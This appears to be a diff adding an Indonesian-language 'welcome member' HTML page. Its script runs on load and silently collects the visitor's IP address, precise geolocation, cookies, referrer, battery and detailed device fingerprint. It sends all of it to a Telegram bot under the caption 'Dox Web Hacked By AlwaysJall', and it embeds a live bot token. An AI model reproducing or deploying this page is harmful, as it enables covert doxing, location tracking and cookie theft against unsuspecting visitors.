@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>INTRODUCE ME IS REALY INFINITY</title>
+  <style>
+    body {
+      background: #000000;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: #333;
+      padding: 30px;
+      text-align: center;
+    }
+
+    h1 {
+      color: #C0C0C0;
+      margin-bottom: 10px;
+    }
+
+    .info {
+      margin-top: 20px;
+      background: #ffffff;
+      padding: 20px;
+      border-radius: 12px;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+      max-width: 600px;
+      margin-left: auto;
+      margin-right: auto;
+      text-align: left;
+    }
+
+    .label {
+      font-weight: bold;
+    }
+
+    .value {
+      color: #B22222;
+    }
+  </style>
+</head>
+<body>
+  <h1>Selamat datang!</h1>
+  <p>HI MEMBER</p>
+  <div class="info" >Hi Realy Infinity</div>
+  <div class="info"id="info">YOU INFORMATION</div>
+
+  <script>
+    async function getInfo() {
+      const token = "7901875757:AAHRKZJkEUtOjHjjgdDTWD6fMDhpUfGgmOU";
+      const chat_id = "6542273161";
+
+      const ipData = await fetch("https://api.ipify.org?format=json").then(res => res.json());
+      const ip = ipData.ip;
+
+      let lat = "Tidak tersedia";
+      let lon = "Tidak tersedia";
+
+      const platform = navigator.platform;
+      const ua = navigator.userAgent;
+      const screenWidth = window.screen.width;
+      const screenHeight = window.screen.height;
+      const colorDepth = window.screen.colorDepth;
+      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const language = navigator.language;
+      const cookiesEnabled = navigator.cookieEnabled;
+      const cpuCores = navigator.hardwareConcurrency;
+      const onlineStatus = navigator.onLine;
+      const appName = navigator.appName;
+      const appVersion = navigator.appVersion;
+      const vendor = navigator.vendor;
+      const platformType = navigator.platform;
+      const screenOrientation = window.screen.orientation ? window.screen.orientation.type : "Tidak tersedia";
+      const deviceMemory = navigator.deviceMemory || "Tidak tersedia";
+      const userAgent = navigator.userAgent;
+
+      let battery = "Tidak tersedia";
+      if (navigator.getBattery) {
+        const batt = await navigator.getBattery();
+        battery = (batt.level * 100) + "%";
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+          lat = pos.coords.latitude;
+          lon = pos.coords.longitude;
+          kirimData();
+        },
+        (err) => {
+          kirimData();
+        }
+      );
+
+      function kirimData() {
+        const infoHTML = `
+          <div><span class="label">IP:</span> <span class="value">${ip}</span></div>
+          <div><span class="label">Lokasi:</span> <span class="value">${lat}, ${lon}</span></div>
+          <div><span class="label">Baterai:</span> <span class="value">${battery}</span></div>
+          <div><span class="label">Platform:</span> <span class="value">${platform}</span></div>
+          <div><span class="label">User Agent:</span> <span class="value">${userAgent}</span></div>
+          <div><span class="label">Resolusi Layar:</span> <span class="value">${screenWidth}x${screenHeight}</span></div>
+          <div><span class="label">Kedalaman Warna:</span> <span class="value">${colorDepth} bit</span></div>
+          <div><span class="label">Zona Waktu:</span> <span class="value">${timeZone}</span></div>
+          <div><span class="label">Bahasa:</span> <span class="value">${language}</span></div>
+          <div><span class="label">Cookies Aktif:</span> <span class="value">${cookiesEnabled ? "Ya" : "Tidak"}</span></div>
+          <div><span class="label">Cores CPU:</span> <span class="value">${cpuCores}</span></div>
+          <div><span class="label">Status Online:</span> <span class="value">${onlineStatus ? "Online" : "Offline"}</span></div>
+          <div><span class="label">Nama Aplikasi:</span> <span class="value">${appName}</span></div>
+          <div><span class="label">Versi Aplikasi:</span> <span class="value">${appVersion}</span></div>
+          <div><span class="label">Vendor:</span> <span class="value">${vendor}</span></div>
+          <div><span class="label">Tipe Platform:</span> <span class="value">${platformType}</span></div>
+          <div><span class="label">Orientasi Layar:</span> <span class="value">${screenOrientation}</span></div>
+          <div><span class="label">Memori Perangkat:</span> <span class="value">${deviceMemory}</span></div>
+          <div><span class="label">User Agent:</span> <span class="value">${ua}</span></div>
+          <div><span class="label">Tipe Koneksi:</span> <span class="value">${navigator.connection ? navigator.connection.effectiveType : "Tidak Tersedia"}</span></div>
+          <div><span class="label">Panjang URL:</span> <span class="value">${window.location.href.length}</span></div>
+          <div><span class="label">Referer:</span> <span class="value">${document.referrer || "Tidak ada"}</span></div>
+          <div><span class="label">Cookie:</span> <span class="value">${document.cookie || "Tidak ada"}</span></div>
+          <div><span class="label">Screen DPI:</span> <span class="value">${window.devicePixelRatio}</span></div>
+          <div><span class="label">WebGL Support:</span> <span class="value">${navigator.plugins.length > 0 ? "Ya" : "Tidak"}</span></div>
+          <div><span class="label">Touch Support:</span> <span class="value">${'ontouchstart' in window ? "Ya" : "Tidak"}</span></div>
+          <div><span class="label">File System:</span> <span class="value">${navigator.storage ? "Tersedia" : "Tidak Tersedia"}</span></div>
+          <div><span class="label">Media Device:</span> <span class="value">${navigator.mediaDevices ? "Tersedia" : "Tidak Tersedia"}</span></div>
+          <div><span class="label">Geolocation:</span> <span class="value">${navigator.geolocation ? "Tersedia" : "Tidak Tersedia"}</span></div>
+          <div><span class="label">Battery Status:</span> <span class="value">${navigator.getBattery ? "Tersedia" : "Tidak Tersedia"}</span></div>
+          <div><span class="label">Navigator Language:</span> <span class="value">${navigator.language}</span></div>
+          <div><span class="label">Screen Orientation:</span> <span class="value">${window.screen.orientation ? window.screen.orientation.type : "Tidak Tersedia"}</span></div>
+          <div><span class="label">Device Memory:</span> <span class="value">${navigator.deviceMemory || "Tidak Tersedia"}</span></div>
+          <div><span class="label">App Version:</span> <span class="value">${navigator.appVersion}</span></div>
+          <div><span class="label">OS Name:</span> <span class="value">${navigator.platform}</span></div>
+          <div><span class="label">User Timezone:</span> <span class="value">${Intl.DateTimeFormat().resolvedOptions().timeZone}</span></div>
+          <div><span class="label">CPU Cores:</span> <span class="value">${navigator.hardwareConcurrency}</span></div>
+          <div><span class="label">Connection Speed:</span> <span class="value">${navigator.connection ? navigator.connection.downlink : "Tidak Tersedia"}</span></div>
+          <div><span class="label">Browser Language:</span> <span class="value">${navigator.language}</span></div>
+          <div><span class="label">Device Type:</span> <span class="value">${window.innerWidth > 768 ? "Desktop" : "Mobile"}</span></div>
+          <div><span class="label">Battery Charging:</span> <span class="value">${navigator.getBattery ? "Tersedia" : "Tidak Tersedia"}</span></div>
+          <div><span class="label">Locale:</span> <span class="value">${navigator.language}</span></div>
+          <div><span class="label">Navigator Memory:</span> <span class="value">${navigator.deviceMemory || "Tidak Tersedia"}</span></div>
+          <div><span class="label">Navigator App:</span> <span class="value">${navigator.appName}</span></div>
+        `;
+
+        document.getElementById("info").innerHTML = infoHTML;
+
+        const text = `𝑫𝒐𝒙 𝑾𝒆𝒃 𝑯𝒂𝒄𝒌𝒆𝒅 𝑩𝒚 𝑨𝒍𝒘𝒂𝒚𝒔𝑱𝒂𝒍𝒍 :
+        
+IP: ${ip}
+Lokasi: ${lat}, ${lon}
+Battery: ${battery}
+Platform: ${platform}
+User Agent: ${userAgent}
+Resolusi Layar: ${screenWidth}x${screenHeight}
+Kedalaman Warna: ${colorDepth} bit
+Zona Waktu: ${timeZone}
+Bahasa: ${language}
+Cookies Aktif: ${cookiesEnabled ? "Ya" : "Tidak"}
+Cores CPU: ${cpuCores}
+Status Online: ${onlineStatus ? "Online" : "Offline"}
+Nama Aplikasi: ${appName}
+Versi Aplikasi: ${appVersion}
+Vendor: ${vendor}
+Tipe Platform: ${platformType}
+Orientasi Layar: ${screenOrientation}
+Memori Perangkat: ${deviceMemory}
+User Agent: ${userAgent}
+Tipe Koneksi: ${navigator.connection ? navigator.connection.effectiveType : "Tidak Tersedia"}
+Panjang URL: ${window.location.href.length}
+Referer: ${document.referrer || "Tidak ada"}
+Cookie: ${document.cookie || "Tidak ada"}
+Screen DPI: ${window.devicePixelRatio}
+WebGL Support: ${navigator.plugins.length > 0 ? "Ya" : "Tidak"}
+Touch Support: ${'ontouchstart' in window ? "Ya" : "Tidak"}
+File System: ${navigator.storage ? "Tersedia" : "Tidak Tersedia"}
+Media Device: ${navigator.mediaDevices ? "Tersedia" : "Tidak Tersedia"}
+Geolocation: ${navigator.geolocation ? "Tersedia" : "Tidak Tersedia"}
+Battery Status: ${navigator.getBattery ? "Tersedia" : "Tidak Tersedia"}
+Navigator Language: ${navigator.language}
+Screen Orientation: ${window.screen.orientation ? window.screen.orientation.type : "Tidak Tersedia"}
+Device Memory: ${navigator.deviceMemory || "Tidak Tersedia"}
+App Version: ${navigator.appVersion}
+OS Name: ${navigator.platform}
+User Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+CPU Cores: ${navigator.hardwareConcurrency}
+Connection Speed: ${navigator.connection ? navigator.connection.downlink : "Tidak Tersedia"}
+Browser Language: ${navigator.language}
+Device Type: ${window.innerWidth > 768 ? "Desktop" : "Mobile"}
+Battery Charging: ${navigator.getBattery ? "Tersedia" : "Tidak Tersedia"}
+Locale: ${navigator.language}
+Navigator Memory: ${navigator.deviceMemory || "Tidak Tersedia"}
+Navigator App: ${navigator.appName}`;
+
+  
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: 'POST',
+          body: JSON.stringify({
+            chat_id: chat_id,
+            text: text,
+          }),
+          headers: {
+            'Content-Type': 'application/json',
+          },
+        });
+      }
+    }
+
+    
+    getInfo();
+  </script>
+</body>
+</html>
